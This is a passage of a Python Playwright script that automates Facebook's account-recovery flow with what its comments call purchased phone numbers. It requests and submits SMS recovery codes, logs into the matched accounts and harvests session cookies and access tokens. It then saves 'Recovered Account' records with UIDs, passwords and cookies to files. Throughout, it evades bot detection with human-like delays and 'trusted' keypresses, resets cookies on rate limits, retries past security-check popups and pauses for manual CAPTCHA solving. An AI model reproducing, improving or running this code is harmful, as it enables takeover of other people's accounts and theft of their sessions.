        if not submit_success:
            print("⚠️ Standard click failed. Trying keyboard Enter keypress inside code input field...")
            try:
                # Pressing Enter inside the active code input field naturally submits the form
                code_input.focus()
                time.sleep(random.uniform(0.3, 0.7))
                target.keyboard.press("Enter")
                print("✅ Dispatched code form submit via keyboard Enter!")
                submit_success = True
            except Exception as kb_err:
                print(f"❌ Keyboard Enter submit fallback failed: {kb_err}")
                
        if submit_success:
            print("✅ Clicked Submit to verify code!")
            time.sleep(5)
            return True
        else:
            return False
    except Exception as e:
        print(f"❌ Error submitting code to Facebook: {e}")
        return False


def wait_for_login_complete(target: Page) -> bool:
    """Wait for Facebook to fully log in after code verification."""
    print("\n⏳ Waiting for Facebook to complete login...")
    
    try:
        # Wait for the page to redirect/settle after code submission
        # Usually redirects to https://www.facebook.com/home.php or dashboard
        target.wait_for_url(re.compile(r"facebook\.com/(home|checkpoint)"), timeout=30000)
        
        print("✅ Login appears to be complete!")
        
        # Give it a few more seconds to settle
        time.sleep(5)
        
        # Check if we're at a profile/home page
        try:
            # Look for indicators we're logged in
            profile_link = target.locator("[href*='/profile']").first
            if profile_link.is_visible(timeout=3000):
                print("✅ Profile link visible - account is logged in!")
                return True
        except:
            pass
        
        # If we can find the main feed or any logged-in indicator
        try:
            feed = target.locator("[role='feed'], [data-pagelet='FeedStream']").first
            if feed.is_visible(timeout=3000):
                print("✅ Feed visible - account is logged in!")
                return True
        except:
            pass
        
        print("✅ Account login successful (page redirected)")
        return True
        
    except Exception as e:
        print(f"⚠️ Timeout waiting for login: {e}")
        print("Proceeding anyway to extract session data...")
        return True


def extract_session_data(context, target: Page, phone_number: str, password_used: str, profile_name: str, two_fa: str = "") -> None:
    print("\n🍪 Extracting session cookies and tokens...")
    time.sleep(5) # Wait for login to complete
    
    try:
        # 1. Extract Cookies
        cookies = context.cookies("https://www.facebook.com")
        cookie_string = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
        
        # 2. Extract Access Token (EAAB...)
        # Often found in the page source inside a script tag
        content = target.content()
        token_match = re.search(r'EAAB\w+', content)
        access_token = token_match.group(0) if token_match else "Token not found"
        
        # Find the Facebook UID (c_user cookie)
        uid = phone_number
        for c in cookies:
            if c['name'] == 'c_user':
                uid = c['value']
                break
                
        # 3. Save to file in an aligned table format
        # We pad the strings with spaces so the pipes line up perfectly vertically.
        uid_padded = str(uid).ljust(18)
        pass_padded = str(password_used).ljust(20)
        two_fa_padded = str(two_fa if two_fa else "").ljust(5)
        
        # Get current date and time
        from datetime import datetime
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        output_data = f"--- Recovered Account [{current_time} | {profile_name} ] ---\n"
        output_data += f"{uid_padded} | {pass_padded} | {two_fa_padded} | {cookie_string}\n"
        output_data += "--------------------------------------------------------\n\n"
        
        # Write to master file (for dashboard compatibility)
        with open(CONFIG.output_file, "a", encoding="utf-8") as f:
            f.write(output_data)
            
        # Write to daily segmented file
        try:
            today_str = datetime.now().strftime("%Y-%m-%d")
            daily_output_file = f"recovered_accounts_{today_str}.txt"
            with open(daily_output_file, "a", encoding="utf-8") as f_daily:
                f_daily.write(output_data)
            print(f"📁 Also saved to daily log: {daily_output_file}")
        except Exception as daily_err:
            print(f"⚠️ Could not save to daily log: {daily_err}")
            
        print(f"✅ Session data extracted and saved to {CONFIG.output_file}")
        if access_token != "Token not found":
            print(f"🔑 Found Token: {access_token[:15]}...")
            
    except Exception as e:
        print(f"❌ Error extracting session data: {e}")


def automate_chrome_onboarding(page: Page, profile_name: str) -> None:
    print("🔍 Checking for Chrome onboarding welcome screen...")
    try:
        # Wait up to 5 seconds to see if onboarding screen elements are visible
        stay_signed_out = page.locator("#decline-button, button:has-text('Stay signed out'), [role='button']:has-text('Stay signed out')").first
        if stay_signed_out.is_visible(timeout=5000):
            print("✨ Onboarding welcome screen detected! Clicking 'Stay signed out'...")
            stay_signed_out.click(timeout=3000)
            time.sleep(1.5)
            
            # Look for profile name input field
            name_input = page.locator("#nameInput, input[type='text'], input[placeholder*='name']").first
            if name_input.is_visible(timeout=3000):
                print(f"✨ Entering profile name label: '{profile_name}'")
                name_input.focus()
                name_input.fill(profile_name)
                time.sleep(1.0)
                
                # Click Done button
                done_btn = page.locator("#submit-button, button:has-text('Done'), [role='button']:has-text('Done')").first
                if done_btn.is_visible(timeout=3000):
                    done_btn.click(timeout=3000)
                    print("✅ Chrome profile setup completed successfully!")
                    time.sleep(3.0)
    except Exception as e:
        print(f"ℹ️ Welcome onboarding check finished: {e}")


def handle_facebook_cookie_consent(page: Page) -> None:
    print("🔍 Checking for Facebook cookie consent overlay...")
    try:
        # Common selectors for Facebook's cookie banner buttons across different locales
        consent_selectors = [
            "button[data-testid='cookie-policy-manage-dialog-accept-button']",
            "button[data-testid='cookie-policy-dialog-accept-button']",
            "button:has-text('Allow all cookies')",
            "button:has-text('Permitir todos os cookies')",
            "button:has-text('Aceitar todos')",
            "button:has-text('Accept All')",
            "[aria-label='Allow all cookies']",
            "[aria-label='Aceitar todos']",
            "button:has-text('Allow')",
            "button:has-text('Agree')"
        ]
        # Combine selectors with commas to check them all at once
        consent_selector = ", ".join(consent_selectors)
        btn = page.locator(consent_selector).first
        if btn.is_visible(timeout=5000):
            print(f"✨ Cookie consent banner detected! Clicking accept button...")
            btn.click(timeout=3000)
            time.sleep(random.uniform(1.5, 2.5))
    except Exception as e:
        print(f"ℹ Welcome cookie consent overlay check finished: {e}")


def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
    pages = context.pages
    target = pages[0] if pages else context.new_page()
    
    # Check if we are on a chrome onboarding/picker tab before navigating
    try:
        url = target.url
        if "welcome" in url.lower() or "profile-picker" in url.lower() or "chrome://" in url.lower():
            # Extract name of the profile folder as default label
            p_label = "Recovery Profile"
            try:
                # Read from directory name if available in context options
                # Usually standalone profiles look like Profile 25, Profile 26
                for c in context.pages:
                    m = re.search(r"Profile\s*\d+", c.url, re.I)
                    if m:
                        p_label = m.group(0)
                        break
            except:
                pass
            automate_chrome_onboarding(target, p_label)
    except Exception as picker_err:
        print(f"⚠️ Welcome onboarding check failed: {picker_err}")
        
    # Try to load the desktop recovery URL first
    desktop_recovery_url = "https://www.facebook.com/login/identify/"
    print(f"🌐 Navigating to desktop recovery URL: {desktop_recovery_url}")
    
    try:
        target.goto(desktop_recovery_url, wait_until="domcontentloaded", timeout=15000)
        time.sleep(1.5)
        
        # Check if desktop identify is blocked, rate limited, or failed to render input field
        is_blocked = False
        try:
            # If rate-limit text is visible or target phone selector input is missing
            rate_limit_indicators = target.get_by_text(re.compile("try again later|bloqueado|limite excedido|tentar novamente mais tarde", re.I))
            input_visible = target.locator(CONFIG.target_phone_selector).first.is_visible(timeout=500)
            
            if (rate_limit_indicators.count() > 0 and rate_limit_indicators.first.is_visible(timeout=200)) or not input_visible:
                is_blocked = True
        except:
            is_blocked = True
            
        if is_blocked:
            print(f"⚠️ Desktop recovery page appears rate-limited or blocked. Switching to mobile URL: {CONFIG.target_url}")
            target.goto(CONFIG.target_url, wait_until="domcontentloaded", timeout=15000)
    except Exception as e:
        print(f"⚠️ Desktop navigation failed: {e}. Falling back to configured target URL: {CONFIG.target_url}")
        target.goto(CONFIG.target_url, wait_until="domcontentloaded", timeout=15000)
        
    target.bring_to_front()
    
    # Clear any cookie consent overlay cover sheets
    handle_facebook_cookie_consent(target)
    
    # Check if Facebook is already logged in (meaning we were redirected away from identify to feed/home page)
    is_logged_in = False
    try:
        fb_cookies = context.cookies("https://www.facebook.com")
        c_user = next((c for c in fb_cookies if c['name'] == 'c_user'), None)
        if c_user:
            is_logged_in = True
            print(f"⚠️  Detected logged-in Facebook user (UID: {c_user['value']}) on target page!")
    except Exception:
        pass
        
    if not is_logged_in:
        try:
            if target.locator("div[role='feed'], [data-pagelet='TopNav'], div[aria-label][role='navigation']").first.is_visible(timeout=2000):
                is_logged_in = True
                print("⚠️  Detected active Facebook session on target page layout!")
        except Exception:
            pass
            
    if is_logged_in:
        raise RuntimeError("Target profile is already logged in to Facebook. Skipping to preserve the recovered account session.")
            
    # 1. Let the page settle to mimic a human reading the screen
    import random
    time.sleep(random.uniform(3.5, 6.0))
    
    # Simulate human behavior by slightly scrolling the page after load
    try:
        target.evaluate("window.scrollTo({top: 100, behavior: 'smooth'})")
        time.sleep(random.uniform(0.5, 1.0))
        target.evaluate("window.scrollTo({top: 0, behavior: 'smooth'})")
        time.sleep(random.uniform(0.5, 1.0))
    except Exception:
        pass
        
    print(f"\n📝 Pasting phone number into Facebook recovery page via OS clipboard shortcut: {phone_number}")
    
    # Use trusted keyboard shortcuts (Control+A, Backspace, Control+V) to simulate real copy-paste
    input_field = target.locator(CONFIG.target_phone_selector).first
    try:
        # Click to focus the field with random delay
        input_field.click(delay=int(random.uniform(80, 150)))
        time.sleep(random.uniform(0.8, 1.4))
        
        # Select all and delete
        target.keyboard.press("Control+KeyA")
        time.sleep(random.uniform(0.3, 0.6))
        target.keyboard.press("Backspace")
        time.sleep(random.uniform(0.5, 1.0))
        
        # Paste value directly from system clipboard
        target.keyboard.press("Control+KeyV")
        time.sleep(random.uniform(1.0, 1.5))
    except Exception as paste_err:
        print(f"⚠️ Clipboard paste shortcut failed: {paste_err}. Falling back to default fill...")
        input_field.fill(phone_number)
        time.sleep(1.0)
        
    # Verify the number was actually filled in
    filled_value = input_field.input_value(timeout=5_000)
    print(f"✅ Verified pasted value: '{filled_value}'")
    
    # 2. Pause before clicking Search to mimic natural user preparation
    time.sleep(random.uniform(2.5, 4.5))
    
    print("\n🔘 Clicking Submit button...")
    submit_success = False
    try:
        # Exact regex to match only the primary action button and avoid matching long helper links like "Search by email instead"
        action_names = re.compile(r"^(Continue|Continuar|Avançar|Siguiente|Siguiente|Continuer|Weiter|Search|Pesquisar|Buscar|Rechercher|Suchen|Cerca)$", re.I)
        continue_button = target.get_by_role("button", name=action_names).first
        
        # Check if the element is attached/present in the DOM rather than visible, preventing overlay failures
        is_attached = False
        try:
            continue_button.wait_for(state="attached", timeout=2000)
            is_attached = True
        except:
            # Fallback search using broad class/attribute selectors if exact role matching failed
            continue_button = target.locator("button[name='did_submit']:visible, input[name='did_submit']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
            try:
                continue_button.wait_for(state="attached", timeout=1500)
                is_attached = True
            except:
                # Fallback search inside the form
                continue_button = target.locator("form button, form input[type='submit']").first
                try:
                    continue_button.wait_for(state="attached", timeout=1500)
                    is_attached = True
                except:
                    pass
            
        if is_attached:
            try:
                human_click(continue_button, timeout_ms=5000)
            except Exception as click_err:
                print(f"⚠️ Standard click blocked: {click_err}. Trying trusted forced click...")
                # Forced click bypasses overlays/blockers while keeping the event signature trusted
                continue_button.click(force=True, timeout=5000)
            print("✅ Clicked Submit button successfully!")
            submit_success = True
    except Exception as e:
        print(f"⚠️ Could not click Submit button: {e}")
        
    if not submit_success:
        print("⚠️ Standard click failed. Trying keyboard Enter keypress inside input field...")
        try:
            # Pressing Enter inside the active input field naturally submits the form
            # This triggers the default submit event handler (trusted, non-bot footprint)
            input_field.focus()
            time.sleep(random.uniform(0.3, 0.7))
            target.keyboard.press("Enter")
            print("✅ Dispatched form submit via keyboard Enter!")
            submit_success = True
        except Exception as kb_err:
            print(f"❌ Keyboard Enter submit fallback failed: {kb_err}")
            
    if not submit_success:
        target.close()
        return "error", None
        
    time.sleep(3)
    
    print("⏳ Waiting for Facebook to process the number...")
    digits_only = "".join([c for c in phone_number if c.isdigit()])
    last_two = digits_only[-2:] if len(digits_only) >= 2 else ""
    
    max_waits = 15
    for i in range(max_waits):
        # 1. Check for CAPTCHA (Using iframes or text)
        try:
            captcha_iframe = target.locator("iframe[src*='recaptcha'], iframe[title*='recaptcha'], iframe[src*='captcha'], .g-recaptcha").first
            captcha_text = target.get_by_text(re.compile("Help us confirm|Confirm it's you|Confirm that it's you", re.I)).first
            if captcha_iframe.is_visible(timeout=500) or captcha_text.is_visible(timeout=500):
                print("\a\a\a") # Play console alert beep
                print("\n🚨🚨🚨 CAPTCHA DETECTED! 🚨🚨🚨")
                print("🛑 AUTOMATION PAUSED. Please solve the CAPTCHA manually in the browser window.")
                print("⏳ The script will automatically resume once the CAPTCHA popup is solved and disappears...")
                if captcha_iframe.is_visible():
                    captcha_iframe.wait_for(state="hidden", timeout=300_000)
                else:
                    captcha_text.wait_for(state="hidden", timeout=300_000)
                print("✅ CAPTCHA solved! Resuming script...")
                time.sleep(3)
        except Exception:
            pass

        # 1b. Check for "Choose your account" multiple accounts list screen (Language-Agnostic)
        try:
            # Check for the header text "Choose your account" (case-insensitive, multi-language)
            choose_account_heading = target.get_by_text(re.compile(
                r"Choose your account|Elige tu cuenta|Escolha (a )?sua conta|Choisissez votre compte|Scegli il tuo account|Wähle dein Konto|Wähle dein Profil|match the email or mobile number|perfis do Facebook correspondem", 
                re.I
            )).first
            
            is_choose_account_page = False
            if choose_account_heading.is_visible(timeout=500):
                is_choose_account_page = True
            else:
                # Fallback: if we see the back arrow and the input field is gone
                input_visible = target.locator(CONFIG.target_phone_selector).first.is_visible(timeout=200)
                # If there's no input field, but we are still on the identify/recover page:
                if not input_visible and ("identify" in target.url.lower() or "recover" in target.url.lower()):
                    is_choose_account_page = True

            if is_choose_account_page:
                print("\n👥 'Choose your account' page detected! Selecting a matching profile...")
                
                profile_candidates = target.locator(
                    "a, button, [role='button'], [role='link'], [role='listitem'], "
                    "div[class*='card'], div[class*='item'], div[class*='row'], "
                    "div[class*='profile'], div[class*='account'], [role='list'] > div, "
                    "div._85el"
                 ).all()
                
                # Filter down to visible elements that are likely profiles
                valid_profiles = []
                for p_item in profile_candidates:
                    try:
                        if p_item.is_visible(timeout=100):
                            href = p_item.get_attribute("href") or ""
                            text = p_item.inner_text().strip()
                            
                            is_lang_link = any(lang in text for lang in ["English", "Português", "Español", "Français", "Italiano", "Deutsch", "More languages", "Idiomas"])
                            is_back_btn = any(keyword in text.lower() for keyword in [
                                "back", "voltar", "regresar", "not you", "não é você", "no eres tú",
                                "search by", "procurar por", "buscar por", "find your", "create account", 
                                "criar conta", "crear cuenta", "cancel", "cancelar", "try again", "tente de novo",
                                "choose your account", "escolha a sua conta", "seleciona tu cuenta",
                                "confirm your account", "confirmar sua conta", "confirmar tu cuenta",
                                "sign up", "cadastre-se", "registrarse", "log in", "entrar", "iniciar sessão",
                                "sign in", "about", "sobre", "privacy", "privacidade", "terms", "termos", "cookies"
                            ]) or text.strip() in ["<", ">", ""] or len(text) > 40
                            
                            if not is_lang_link and not is_back_btn and len(text) > 0:
                                valid_profiles.append(p_item)
                    except Exception:
                        pass
                
                if len(valid_profiles) >= 1:
                    print(f"🎯 Found {len(valid_profiles)} matching profile options. Clicking the first one: '{valid_profiles[0].inner_text().strip().replace(chr(10), ' ')}'...")
                    try:
                        valid_profiles[0].click(timeout=5000)
                    except Exception:
                        try:
                            valid_profiles[0].click(timeout=5000, force=True)
                        except Exception:
                            valid_profiles[0].evaluate("el => el.click()")
                    time.sleep(3)
                else:
                    print("⚠️ Detected Choose Account page, but could not identify the profile buttons automatically.")
        except Exception as choose_err:
            print(f"⚠️ Error handling 'Choose your account' screen: {choose_err}")
            
        # 1c. Check for "Profile Confirmation" screen (where it displays the matched profile name and a continue button, but no options or inputs yet)
        try:
            continue_btn = target.locator("button[name='reset_action']:visible, input[name='reset_action']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
            has_radios = target.locator("input[type='radio'], [role='radio']").count() > 0
            has_code_input = target.locator("input[name='n'], #recovery_code_entry").first.is_visible(timeout=200)
            has_phone_input = target.locator(CONFIG.target_phone_selector).first.is_visible(timeout=200)
            
            if continue_btn.is_visible(timeout=500) and not has_radios and not has_code_input and not has_phone_input:
                if "identify" in target.url.lower() or "recover" in target.url.lower():
                    print("\n👤 Profile confirmation screen detected (displaying matched name). Clicking Continue...")
                    try:
                        human_click(continue_btn, timeout_ms=5000)
                    except Exception:
                        continue_btn.click(force=True, timeout=5000)
                    time.sleep(3)
                    continue
        except Exception as profile_confirm_err:
            pass
            
        # 2. Check for Error State (e.g., "No account found" or "Request Couldn't be Processed")
        try:
            # Check for specific 'Request Couldn't be Processed' rate limit screen
            error_page = target.get_by_text(re.compile("Request Couldn't be Processed|problem with this request|não foi possível processar|Não foi possível processar", re.I)).first
            if error_page.is_visible(timeout=500):
                print("\n⚠️ Facebook IP Rate Limit / Block Screen Detected ('Your Request Couldn't Be Processed')!")
                print("🧹 Clearing Facebook cookies to reset session state...")
                try: context.clear_cookies()
                except: pass
                return "rate_limited", target
                
            # Check for standard alert boxes
            alert_box = target.locator("div[role='alert'], .pam.login_error_box, #error_box").first
            if alert_box.is_visible(timeout=500):
                try:
                    error_text = alert_box.inner_text().strip()
                except:
                    error_text = "Unknown Error"
                
                if "try again later" in error_text.lower() or "problem with this request" in error_text.lower():
                    print(f"⚠️ Rate limited or blocked by Facebook: '{error_text}'")
                    return "rate_limited", target
                else:
                    print(f"❌ Error: Detected an error alert on the page: '{error_text}'")
                    return "not_found", target

            # Check for "We couldn't find your account" overlay modal (mobile format popup)
            account_not_found_popup = target.get_by_text(re.compile("We couldn't find your account|Não encontramos sua conta|No encontramos tu cuenta", re.I)).first
            try_again_button = target.locator("button:has-text('Try again'), [role='button']:has-text('Try again'), button:has-text('Tentar novamente'), [role='button']:has-text('Tentar novamente'), button:has-text('Intentar de nuevo'), [role='button']:has-text('Intentar de nuevo')").first
            if account_not_found_popup.is_visible(timeout=500) and try_again_button.is_visible(timeout=500):
                print("\n❌ Facebook Popup: 'We couldn't find your account' detected!")
                print("🔘 Clicking 'Try again' to dismiss the modal...")
                try:
                    human_click(try_again_button, timeout_ms=3000)
                except Exception:
                    try_again_button.click(force=True, timeout=3000)
                time.sleep(2)
                return "not_found", target
        except Exception:
            pass
            
        # 3. Check for Checkpoint/Identity Lock
        try:
            if target.url and "checkpoint" in target.url.lower():
                print("\n❌ Account is locked in a Facebook Checkpoint (Identity Confirm)!")
                print("🧹 Clearing Facebook cookies to force logout...")
                context.clear_cookies()
                print("🔴 Leaving Facebook tab open for next attempt...")
                return "not_found", target
        except Exception:
            pass
            
        # 3. Check for Options State ("Choose a way to log in")
        # We look for radio buttons
        try:
            if target.locator("input[type='radio'], [role='radio']").count() > 0:
                print("\n✅ Found radio button options (Choose a way to log in)!")
                
                # Check for "See more" / "Ver mais" / "Ver más" link to expand all hidden options
                try:
                    see_more = target.locator("a:has-text('See more'), [role='button']:has-text('See more'), a:has-text('Ver mais'), [role='button']:has-text('Ver mais'), a:has-text('Ver más'), [role='button']:has-text('Ver más')").first
                    if see_more.is_visible(timeout=500):
                        print("🔘 Clicking 'See more' link to expand all recovery options...")
                        try:
                            human_click(see_more, timeout_ms=3000)
                        except Exception:
                            see_more.click(force=True, timeout=3000)
                        time.sleep(2)
                except Exception as see_more_err:
                    pass
                
                if not last_two:
                    print("⚠️ Could not extract last 2 digits. Cannot proceed automatically.")
                    return "success", target
                    
                # Scan page options first to see if Facebook is using phone previews
                page_has_phone_previews = False
                for p_selector in ["label", "[role='radio']", "div[role='button']", "div.uiInputLabel", "div.row", "div"]:
                    try:
                        all_opts = target.locator(p_selector).all()
                        for o_item in all_opts:
                            try:
                                opt_text = o_item.inner_text().strip()
                                if "*" in opt_text or "+" in opt_text:
                                    # Ensure it has digits to represent a phone preview
                                    digits = [c for c in opt_text if c.isdigit()]
                                    if len(digits) >= 3:
                                        page_has_phone_previews = True
                                        break
                            except:
                                pass
                        if page_has_phone_previews:
                            break
                    except:
                        pass
                
                print(f"🔍 Looking for an option ending in '{last_two}' (Page has phone previews: {page_has_phone_previews})...")
                
                found_match = False
                matched_option_element = None
                wait_duration = 0
                
                # Look in labels, radios, buttons, or any generic div
                for selector in ["label", "[role='radio']", "div[role='button']", "div.uiInputLabel", "div.row", "div"]:
                    options = target.locator(selector).all()
                    for opt in options:
                        try:
                            text = opt.inner_text().strip()
                            if not text:
                                continue
                                
                            # Prioritize "SMS" delivery options and ignore WhatsApp/Password options
                            is_sms_opt = any(keyword in text.lower() for keyword in ["sms", "torpedos", "mensagem de texto", "mensaje de texto", "message de texto", "text message", "torpedo"])
                            is_wa_opt = "whatsapp" in text.lower() or "whats" in text.lower()
                            is_password_opt = "password" in text.lower() or "senha" in text.lower() or "sandi" in text.lower() or "contraseña" in text.lower()
                            
                            if is_sms_opt and not is_wa_opt and not is_password_opt:
                                # Extract phone preview line to prevent extra digits (e.g. "1 SMS left") from corrupting the check
                                phone_line = None
                                for line in text.split("\n"):
                                    line_strip = line.strip()
                                    if "*" in line_strip or line_strip.startswith("+"):
                                        phone_line = line_strip
                                        break
                                if not phone_line:
                                    phone_line = text
                                    
                                digits_in_text = ''.join([c for c in phone_line if c.isdigit()])
                                
                                is_match = False
                                # 1. If digits match our purchased number last two, it's a match
                                if digits_in_text and digits_in_text.endswith(last_two):
                                    is_match = True
                                # 2. Fallback: If no phone digits exist in this row text (e.g. it shows a profile name instead of a phone number)
                                # but it's explicitly SMS, and not WhatsApp/Password, select it as a candidate ONLY if the page is not displaying phone previews.
                                elif not page_has_phone_previews and (not digits_in_text or len(digits_in_text) < 2):
                                    print("ℹ️ Row has no phone digits and page is not displaying phone previews. Evaluating as fallback SMS match...")
                                    is_match = True
                                    
                                if is_match:
                                    # Check if the matched option is disabled or error flagged (e.g. "We can't send SMS right now")
                                    is_disabled_error = any(phrase in text.lower() for phrase in [
                                        "can't send sms", "can not send", "não podemos enviar", 
                                        "no podemos enviar", "impossible d'envoyer", "tentar novamente mais tarde",
                                        "available again", "try again in", "disponível novamente", "disponible de nuevo"
                                    ])
                                    
                                    if is_disabled_error:
                                        print(f"⚠️ Matched option is disabled/error flagged: '{text.replace(chr(10), ' ')}'")
                                        # Skip this match as it is invalid
                                        continue
                                        
                                    # Check for countdown cooldown pattern like (00:59) or similar duration brackets
                                    has_cooldown = re.search(r"\((\d{2}):(\d{2})\)", text)
                                    if has_cooldown:
                                        minutes = int(has_cooldown.group(1))
                                        seconds = int(has_cooldown.group(2))
                                        wait_duration = (minutes * 60) + seconds + 5  # 5s safety buffer
                                        print(f"⏳ Cooldown detected on SMS match: '{text.replace(chr(10), ' ')}'. Will wait {wait_duration}s.")
                                    
                                    # We found our match! Keep reference to this element
                                    matched_option_element = opt
                                    found_match = True
                                    break
                        except:
                            pass
                    if found_match:
                        break
                        
                if found_match and matched_option_element:
                    if wait_duration > 0:
                        print(f"⏳ Sleeping for {wait_duration} seconds to allow option cooldown to clear...")
                        time.sleep(wait_duration)
                        print("✅ Cooldown wait completed! Selecting SMS option...")
                    
                    try:
                        # Find the radio button input or radio circle inside this row option to click explicitly
                        radio_btn = matched_option_element.locator("input[type='radio'], [role='radio'], div[class*='circle'], div[class*='radio']").first
                        if radio_btn.is_visible(timeout=500):
                            print("🔘 Found radio element inside matched SMS option. Clicking it...")
                            radio_btn.click(timeout=3000)
                        else:
                            matched_option_element.click(timeout=5000)
                    except Exception:
                        try:
                            matched_option_element.click(timeout=5000, force=True)
                        except Exception:
                            matched_option_element.evaluate("el => el.click()")
                    time.sleep(1)
                    
                    # Double-check that the option was selected successfully before proceeding
                    selected = False
                    try:
                        radio_el = matched_option_element.locator("input[type='radio']").first
                        if radio_el.is_visible(timeout=500):
                            selected = radio_el.is_checked()
                        else:
                            aria_el = matched_option_element.locator("[role='radio']").first
                            if aria_el.is_visible(timeout=500):
                                selected = aria_el.get_attribute("aria-checked") == "true"
                            else:
                                # Fallback: assume selected if click succeeded
                                selected = True
                    except:
                        selected = True  # Fallback to True if check throws
                        
                    if not selected:
                        print("⚠️ SMS option radio selection could not be confirmed (it might be disabled/unclickable). Skipping submit...")
                        return "not_found", target
                else:
                    print(f"❌ No matching SMS option found ending with '{last_two}'.")
                    print("Leaving tab open and retrying with a new number...")
                    return "not_found", target
                    
                if found_match:
                    print("🔘 Clicking Submit...")
                    submit_success = False
                    
                    # Broad, tag-agnostic locator targeting only visible submit buttons to prevent matching hidden inputs
                    continue_btn = target.locator("button[name='reset_action']:visible, input[name='reset_action']:visible, button[name='did_submit']:visible, input[name='did_submit']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
                    
                    # Check if the element is attached/present in the DOM
                    is_attached = False
                    try:
                        continue_btn.wait_for(state="attached", timeout=1500)
                        if continue_btn.is_visible(timeout=500):
                            is_attached = True
                    except:
                        pass
                        
                    # Fallback to text-based button matching if not found or not visible
                    if not is_attached:
                        print("🔍 Submit button by attribute not found. Trying text-based button matching...")
                        continue_btn = target.locator("button:has-text('Continue'):visible, button:has-text('Continuar'):visible, button:has-text('Avançar'):visible, [role='button']:has-text('Continue'):visible, [role='button']:has-text('Continuar'):visible, [role='button']:has-text('Avançar'):visible").first
                        try:
                            continue_btn.wait_for(state="attached", timeout=1500)
                            is_attached = True
                        except:
                            pass
                            
                    if is_attached:
                        # Attempt to click OK and re-click Continue up to 3 times if Security Check popup appears
                        max_security_retries = 3
                        for challenge_attempt in range(max_security_retries):
                            try:
                                human_click(continue_btn, timeout_ms=5000)
                                submit_success = True
                            except Exception as click_err:
                                print(f"⚠️ Option submit standard click blocked: {click_err}. Trying forced click...")
                                try:
                                    continue_btn.click(force=True, timeout=5000)
                                    submit_success = True
                                except Exception as force_err:
                                    print(f"⚠️ Option submit forced click failed: {force_err}")
                            
                            time.sleep(2)
                            
                            # Check for "Please Complete Security Check" popup overlay
                            security_popup = target.get_by_text(re.compile("Security Check|Verificação de segurança|Control de seguridad", re.I)).first
                            ok_button = target.locator("button:has-text('OK'), [role='button']:has-text('OK')").first
                            
                            try:
                                if security_popup.is_visible(timeout=500) and ok_button.is_visible(timeout=500):
                                    print(f"\n⚠️ Security Check popup detected! (Attempt {challenge_attempt + 1}/{max_security_retries})")
                                    print("🔘 Dismissing popup by clicking 'OK'...")
                                    try:
                                        human_click(ok_button, timeout_ms=3000)
                                    except Exception:
                                        ok_button.click(force=True, timeout=3000)
                                    time.sleep(2)
                                    submit_success = False  # Reset to false to trigger retry loop
                                else:
                                    break  # No popup detected, exit challenge loop
                            except:
                                break  # Check failed or elements vanished, assume clean path
                                
                        if submit_success:
                            print("✅ Account recovery code requested successfully!")
                    
                    if not submit_success:
                        print("⚠️ Submit button click failed. Trying keyboard Enter keypress on selected option...")
                        try:
                            # Pressing Enter on the focused selected option submits the form naturally (trusted, non-bot footprint)
                            opt.focus()
                            time.sleep(random.uniform(0.3, 0.7))
                            target.keyboard.press("Enter")
                            print("✅ Dispatched options submit via keyboard Enter!")
                            submit_success = True
                        except Exception as kb_err:
                            print(f"❌ Keyboard Enter submit fallback failed: {kb_err}")
                            
                    if submit_success:
                        # Wait for transition to code entry page or error banner
                        print("⏳ Waiting for code entry page to load...")
                        transition_success = False
                        start_wait = time.time()
                        code_input = None
                        while time.time() - start_wait < 15:
                            # 1. Check if code input is visible
                            code_input = target.locator("input[name='n'], #recovery_code_entry, input[type='text'], input[type='number']").first
                            try:
                                if code_input.is_visible(timeout=500):
                                    print("✅ Successfully transitioned to the code entry page!")
                                    transition_success = True
                                    break
                            except:
                                pass
                                
                            # 2. Check if the "We can't send SMS" toast/banner has appeared
                            try:
                                sms_error_indicators = target.get_by_text(re.compile(
                                    r"We can't send SMS to this mobile number|Não podemos enviar um SMS para este número|No podemos enviar un SMS a este número|Não é possível enviar SMS para este número|No se puede enviar un SMS a este número", 
                                    re.I
                                )).first
                                if sms_error_indicators.is_visible(timeout=500):
                                    print("\n❌ Facebook error banner detected: 'We can't send SMS to this mobile number at the moment.'")
                                    return "not_found", target
                            except:
                                pass
                                
                            time.sleep(0.5)
                            
                        if transition_success:
                            return "success", target
                            
                        # If not transitioned after 15 seconds, check if we are still on the options page
                        # Let's try one re-click fallback
                        try:
                            if target.locator("input[type='radio'], [role='radio']").count() > 0:
                                print("⚠️ Still on options page (possible click lost or slow load). Re-clicking Continue button...")
                                try:
                                    human_click(continue_btn, timeout_ms=3000)
                                except Exception:
                                    continue_btn.click(force=True, timeout=3000)
                                
                                # Wait another 5 seconds
                                time.sleep(5)
                                if code_input and code_input.is_visible(timeout=500):
                                    print("✅ Successfully transitioned to the code entry page after re-click!")
                                    return "success", target
                        except:
                            pass
                            
                        print("❌ Page got stuck on options screen spinner. Treating as rate-limited/blocked.")
                        return "rate_limited", target
                    else:
                        return "error", target
                else:
                    print(f"❌ No SMS option found ending with '{last_two}'.")
                    print("Leaving tab open and retrying with a new number...")
                    return "not_found", target
        except Exception:
            pass
                
        # 3b. Check for WhatsApp Confirmation Screen or Password Entry Screen
        try:
            whatsapp_info = target.get_by_text(re.compile("WhatsApp", re.I)).first
            password_input = target.locator("input[type='password'], input[name='pass'], #password_input_area").first
            try_another_way = target.locator("button:has-text('Try another way'), [role='button']:has-text('Try another way'), button:has-text('Experimentar outro caminho'), [role='button']:has-text('Experimentar outro caminho'), button:has-text('Probar de otra manera'), [role='button']:has-text('Probar de otra manera')").first
            
            is_whatsapp_visible = False
            try: is_whatsapp_visible = whatsapp_info.is_visible(timeout=200)
            except: pass
            
            is_password_visible = False
            try: is_password_visible = password_input.is_visible(timeout=200)
            except: pass
            
            if (is_whatsapp_visible or is_password_visible) and try_another_way.is_visible(timeout=500):
                if is_whatsapp_visible:
                    print("\n💬 WhatsApp code delivery screen detected! Clicking 'Try another way' to load options...")
                else:
                    print("\n🔑 Password entry screen detected! Clicking 'Try another way' to load options...")
                try:
                    human_click(try_another_way, timeout_ms=5000)
                except Exception:
                    try_another_way.click(force=True, timeout=5000)
                time.sleep(3)
        except Exception as wa_err:
            pass

        # 4. Check for Code Entry State ("Confirm your account")
        # We look for the standard code input box (name='n' or id='recovery_code_entry' or name='c')
        try:
